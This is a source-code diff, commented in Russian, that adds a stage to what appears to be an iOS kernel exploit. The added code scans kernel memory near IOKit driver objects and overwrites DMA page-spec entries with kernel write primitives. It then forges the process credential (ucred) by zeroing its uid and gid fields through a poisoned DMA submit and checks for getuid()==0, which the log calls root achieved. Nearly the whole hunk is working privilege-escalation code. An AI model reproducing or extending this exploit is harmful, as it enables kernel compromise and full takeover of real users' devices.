@@ -7423,6 +7423,119 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (!kpLooksLikeKernelPointer(nx) || nx == node) break;
             node = nx;
         }
+        // 1.9.225: SPEC-скан по зоне вокруг драйвер-объектов — [pd+0x60] оказался
+        // массивом VA/len sub-MD (не спек р.55). Спек = kalloc-объект драйвера,
+        // кластерится с pipe/dart/нодами. После execute#1 pfn УЖЕ в спеке —
+        // ищем его голым/упакованным по окну ±32MB, патчим, retry вооружён.
+        {
+            uint64_t specCand[8]; uint32_t specCandForm[8];
+            int nSC = 0;
+            uint64_t anchors225[8]; int na225 = 0;
+            if (kpLooksLikeKernelPointer(pipeVA)) anchors225[na225++] = pipeVA;
+            if (kpLooksLikeKernelPointer(mapVA)) anchors225[na225++] = mapVA;
+            if (kpLooksLikeKernelPointer(dartVA)) anchors225[na225++] = dartVA;
+            if (kpLooksLikeKernelPointer(node)) anchors225[na225++] = node;
+            uint64_t mn225 = ~0ULL, mx225 = 0;
+            for (int a = 0; a < na225; a++) { if (anchors225[a] < mn225) mn225 = anchors225[a]; if (anchors225[a] > mx225) mx225 = anchors225[a]; }
+            if (na225 && mn225 != ~0ULL) {
+                uint64_t lo = (mn225 & ~0x3fffULL) - 0x2000000ULL, hi = (mx225 & ~0x3fffULL) + 0x2000000ULL;
+                int nPg = 0, nMp = 0;
+                for (uint64_t pg = lo; pg < hi && nSC < 8; pg += 0x4000) {
+                    nPg++;
+                    if (!kpSafeToRead(pg)) continue;
+                    nMp++;
+                    uint8_t sbuf[0x4000];
+                    kreadbuf(pg, sbuf, sizeof(sbuf));
+                    for (uint32_t o = 0; o + 8 <= sizeof(sbuf) && nSC < 8; o += 8) {
+                        uint64_t q = 0; memcpy(&q, sbuf + o, 8);
+                        int frm = 0;
+                        if (q == (uint64_t)pfn32) frm = 2;
+                        else if (q == backingPA) frm = 1;
+                        else if ((uint32_t)(q >> 32) == pfn32 && (q & 0xffffffffULL) == 1) frm = 3;
+                        if (!frm) continue;
+                        BOOL vtNear = NO;
+                        for (int d = -2; d <= 2 && !vtNear; d++) {
+                            if (!d) continue;
+                            long oo = (long)o + d * 8;
+                            if (oo < 0 || oo + 8 > (long)sizeof(sbuf)) continue;
+                            uint64_t nv = kp_untag_ptr(*(uint64_t *)(sbuf + oo));
+                            if (nv >= kconstant(base) && nv < kconstant(base) + 0x6000000ULL) vtNear = YES;
+                        }
+                        if (vtNear) continue;
+                        specCand[nSC] = pg + o; specCandForm[nSC] = frm;
+                        uint64_t nq = (frm == 1) ? ((q & 0x3fffULL) | ctlPA)
+                                    : (frm == 2) ? (uint64_t)ctlPFN
+                                    : (((uint64_t)ctlPFN << 32) | (q & 0xffffffffULL));
+                        kpNote(r, [NSString stringWithFormat:@"  [SPC-Z] ★ кандидат форма%d @ %#llx: %#018llx → %#018llx",
+                                  frm, (unsigned long long)(pg + o), (unsigned long long)q, (unsigned long long)nq]);
+                        usleep(2000);
+                        early_kwrite64(pg + o, nq);
+                        uint64_t rb = early_kread64(pg + o);
+                        kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                        nSC++;
+                    }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [SPC-Z] окно: страниц=%d mapped=%d кандидатов=%d", nPg, nMp, nSC]);
+                if (nSC) {
+                    kern_return_t skr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+                    kpNote(r, [NSString stringWithFormat:@"  [SPC-Z] armed submit kr=0x%x — жду execute по отравленному spec", skr]);
+                    usleep(400000);
+                    int chS = 0;
+                    for (uint32_t i = 0; i < 0x4000; i += 4) {
+                        uint32_t px = *(volatile uint32_t *)(ctl + i);
+                        if (px != 0xCCCCCCCC && px != 0) chS++;
+                    }
+                    kpNote(r, [NSString stringWithFormat:@"  [SPC-Z] ctl changed=%d — %@", chS,
+                              chS ? @"★★★ CONFIRMED через spec-яд!" : @"кандидаты мимо (не тот spec)"]);
+                    if (chS) changed = chS;
+                    if (chS) {
+                        // ФОРЖ: те же кандидаты → ucredPA, src = payload (механика 1.9.208)
+                        uint64_t prF3 = 0, roF3 = 0, ucF3 = 0;
+                        if (selfProcM) {
+                            prF3 = early_kread64(selfProcM + koffsetof(proc, proc_ro));
+                            roF3 = prF3 ? kp_untag_ptr(prF3) : 0;
+                            ucF3 = roF3 ? kp_untag_ptr(early_kread64(roF3 + koffsetof(proc_ro, ucred))) : 0;
+                        }
+                        uint64_t upageVA3 = ucF3 & ~0x3fffULL;
+                        uint32_t uoff3 = (uint32_t)(ucF3 & 0x3fff);
+                        uint64_t upagePA3 = kpLooksLikeKernelPointer(ucF3) ? kvtophys(upageVA3) : 0;
+                        uint64_t upkva3 = upagePA3 ? phystokv(upagePA3) : 0;
+                        BOOL uOK3 = upkva3 && early_kread64(upkva3) == early_kread64(upageVA3) &&
+                                    (uint32_t)early_kread64(upkva3 + uoff3 + 0x18) == (uint32_t)getuid() && uoff3 + 0xc0 <= 0x1000;
+                        kpNote(r, [NSString stringWithFormat:@"  [SPC-Z-F] ucred=%#llx upagePA=%#llx — валидация: %@", (unsigned long long)ucF3, (unsigned long long)upagePA3, uOK3 ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ"]);
+                        if (uOK3) {
+                            uint8_t fbuf3[0x1000];
+                            for (uint32_t i = 0; i < 0x1000; i += 8) *(uint64_t *)(fbuf3 + i) = early_kread64(upageVA3 + i);
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x18) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x1c) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x20) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x28) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x68) = 0;
+                            *(uint32_t *)(fbuf3 + uoff3 + 0x6c) = 0;
+                            *(uint64_t *)(fbuf3 + uoff3 + 0x78) = 0;
+                            IOSurfaceLock(srcS, 0, NULL);
+                            uint8_t *sp4 = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+                            if (sp4) memcpy(sp4, fbuf3, 0x1000);
+                            IOSurfaceUnlock(srcS, 0, NULL);
+                            uint32_t fPFN3 = (uint32_t)(upagePA3 >> 14);
+                            for (int i = 0; i < nSC; i++) {
+                                uint64_t cur = early_kread64(specCand[i]);
+                                uint64_t nq = (specCandForm[i] == 1) ? ((cur & 0x3fffULL) | upagePA3)
+                                            : (specCandForm[i] == 2) ? (uint64_t)fPFN3
+                                            : (((uint64_t)fPFN3 << 32) | (cur & 0xffffffffULL));
+                                early_kwrite64(specCand[i], nq);
+                            }
+                            kern_return_t fkr3 = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+                            kpNote(r, [NSString stringWithFormat:@"  [SPC-Z-F] forge-submit kr=0x%x — DMA в ucred", fkr3]);
+                            usleep(400000);
+                            uid_t gu3 = getuid(); gid_t gg3 = getgid();
+                            uint32_t cru3 = (uint32_t)early_kread64(ucF3 + 0x18);
+                            kpNote(r, [NSString stringWithFormat:@"  [SPC-Z-F] getuid()=%u getgid()=%u cr_uid=%u", gu3, gg3, cru3]);
+                            if (gu3 == 0) kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — spec-яд форж ucred РАБОТАЕТ ===");
+                        }
+                    }
+            }
+        }
         if (cmdVA) {
             uint64_t mapObj = kp_untag_ptr(early_kread64(cmdVA + 0x70));
             if (kpLooksLikeKernelPointer(mapObj) && kpSafeToRead(mapObj)) {
